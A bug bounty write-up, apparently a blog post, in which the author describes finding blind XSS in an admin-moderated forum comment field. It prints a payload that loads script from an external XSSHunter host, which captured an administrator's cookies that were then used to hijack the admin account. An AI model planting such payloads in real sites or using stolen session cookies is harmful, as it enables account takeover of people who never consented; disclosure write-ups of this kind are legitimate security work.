# :globe_with_meridians: Blind XSS to Full Control of Forum worth $$$

---

# Blind XSS to Full Control of Forum worth $$$

Hello guys! My name is Tuhin Bose ([@tuhin1729](https://instagram.com/tuhin1729)). I am currently working as a Chief Technology Officer at [Virtual Cyber Labs](https://virtualcyberlabs.com). In this write-up, I am going to share one of my Blind XSS findings which helped me to earn $$$.

So without wasting time, let’s start:

*tuhin1729*

## Introduction:

While enumerating subdomains, I came across an interesting subdomain let’s say community.redacted.com. Basically, it’s a kind of a forum where users of redacted.com can post their queries and comment to others’ queries also. But for publishing comments, it needs approval from admins of redacted.com.

*tuhin1729*

After testing for IDOR, SQLi and other vulnerabilites, I decided to try Blind XSS there.

## What is Blind XSS?

Blind Cross-Site Scripting vulnerabilities occur when the attacker input is saved by the web server and executed as a malicious script in another part of the application or in another application. For example, an attacker injects a malicious payload into a contact/feedback page and when the administrator of the application is reviewing the feedback entries the attacker’s payload will be loaded. The attacker input can be executed in a completely different application (for example an internal application where the administrator reviews the access logs or the application exceptions).

## Steps to Reproduce:

I quickly copied my [XSSHunter](https://xsshunter.com) payload [“><script src=https://tuhin1729.xss.ht></script>] and commented that.

*tuhin1729*

And guess what!!! Within 1–2 minutes, I received the following email:

*tuhin1729*

BOOM! Our Payload was executed!

## Get Tuhin Bose’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

I went to the URL where the payload was executed. There is a login panel for admins. I used those cookies (which are captured from the payload) to hijack admin’s account. Now, I was able to control the entire forum!!!

I ended my hunting there, made a beautiful POC and send it to them.

Within 30 minutes, I got a reply from them:

*tuhin1729*Timeline:

May 18, 2021, 9:23 PM — Vulnerability Reported

May 18, 2021, 9:44 PM — Taken their community page down and replied me with the bounty email

Follow me on Twitter: @[tuhin1729](https://twitter.com/tuhin1729_)_

Thanks for reading. I hope you enjoyed this blog.

---
